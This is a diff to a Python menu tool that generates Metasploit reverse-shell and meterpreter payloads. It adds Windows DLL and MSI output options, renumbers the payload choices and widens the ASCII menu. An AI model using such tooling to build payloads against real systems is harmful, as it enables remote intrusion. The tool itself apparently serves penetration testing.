@@ -194,50 +194,56 @@ def payload():
     #Binaries
     if ven == '1':
         msfpc_format = 'elf'
-    if ven == '2':
+    elif ven == '2':
         msfpc_format = 'exe'
-    if ven == '3':
+    elif ven == '3':
+        msfpc_format = 'dll'
+    elif ven == '4':
+        msfvenom_command = 'windows/meterpreter/reverse_tcp'
+        msfvenom_extension = 'msi'
+        msfvenom_extra = ' -f msi'
+    elif ven == '5':
         msfpc_format = 'macho'
     #Web Payloads
-    if ven == '4':
+    elif ven == '6':
         msfpc_format = 'php'
-    if ven == '5':
+    elif ven == '7':
         msfpc_format = 'asp'
-    if ven == '6':
+    elif ven == '8':
         msfpc_format = 'jsp'
-    if ven == '7':
+    elif ven == '9':
         msfpc_format = 'war'
-    if ven == '8':
+    elif ven == '10':
         msfvenom_command = 'nodejs/shell_reverse_tcp'
         msfvenom_extension = 'js'
 
     #Scripting
-    if ven == '9':
+    elif ven == '11':
         msfpc_format = 'python'
-    if ven == '10':
+    elif ven == '12':
         msfpc_format = 'bash'
-    if ven == '11':
+    elif ven == '13':
         msfpc_format = 'perl'
-    if ven == '12':
+    elif ven == '14':
         msfvenom_command = 'ruby/shell_reverse_tcp'
         msfvenom_extension = 'rb'
 
     #Shellcode
-    if ven == '13':
+    elif ven == '15':
         msfvenom_command = 'linux/x86/meterpreter/reverse_tcp'
         dil = input('Enter language: ')
         if dil.rstrip() == '':
             dil = 'raw'
         msfvenom_extra = f' -f {dil}'
         msfvenom_extension = dil
-    if ven == '14':
+    elif ven == '16':
         msfvenom_command = 'windows/meterpreter/reverse_tcp'
         dil = input('Enter language: ')
         if dil.rstrip() == '':
             dil = 'raw'
         msfvenom_extra = f' -f {dil}'
         msfvenom_extension = dil
-    if ven == '15':
+    elif ven == '17':
         msfvenom_command = 'osx/x86/shell_reverse_tcp'
         dil = input('Enter language: ')
         if dil.rstrip() == '':
@@ -300,24 +306,24 @@ def main(arg):
         shell()
     elif args.use == 'msf':
         print(choice(color) + """
-                     _____________________________________________________
+                      _________________________________________________________
 
-                                 Creating Metasploit Payloads
-         ______________________________________________________________________________
-        |              |                 |                       |                     |
-        | #Binaries    |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
-        |______________|_________________|_______________________|_____________________|
-        |              |                 |                       |                     |
-        | 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux based     |
-        |              |                 |                       |                     |
-        | 2) Windows   | 5) ASP          | 10) Bash              | 14) Windows based   |
-        |              |                 |                       |                     |
-        | 3) Mac       | 6) JSP          | 11) Perl              | 15) Mac based       |
-        |              |                 |                       |                     |
-        |              | 7) WAR          | 12) Ruby              |                     |
-        |              |                 |                       |                     |
-        |              | 8) Nodejs       |                       |                     |
-        |______________|_________________|_______________________|_____________________|
+                                   Creating Metasploit Payloads
+         __________________________________________________________________________________
+        |                  |                 |                       |                     |
+        | #Binaries        |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
+        |__________________|_________________|_______________________|_____________________|
+        |                  |                 |                       |                     |
+        | 1) Linux         | 6)  PHP         | 11) Python            | 15) Linux based     |
+        |                  |                 |                       |                     |
+        | 2) Windows (exe) | 7)  ASP         | 12) Bash              | 16) Windows based   |
+        |                  |                 |                       |                     |
+        | 3) Windows (dll) | 8)  JSP         | 13) Perl              | 17) Mac based       |
+        |                  |                 |                       |                     |
+        | 4) Windows (msi) | 9)  WAR         | 14) Ruby              |                     |
+        |                  |                 |                       |                     |
+        | 5) Mac           | 10) Nodejs      |                       |                     |
+        |__________________|_________________|_______________________|_____________________|
 """)
         payload()
     elif args.use != 'shell' and args.use != 'msf':
